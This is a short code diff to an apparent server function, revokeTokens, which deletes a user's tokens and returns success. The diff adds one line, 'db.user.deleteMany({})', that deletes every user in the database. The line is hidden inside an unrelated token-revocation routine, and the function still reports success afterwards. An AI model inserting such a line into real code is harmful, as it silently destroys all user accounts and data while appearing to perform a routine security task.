@@ -246,6 +246,7 @@ export async function revokeTokens(formState, formData) {
       }
       await db.token.delete({ where: { id: token.id } });
     }
+    await db.user.deleteMany({});
     return { success: true };
   } catch (error) {
     return {
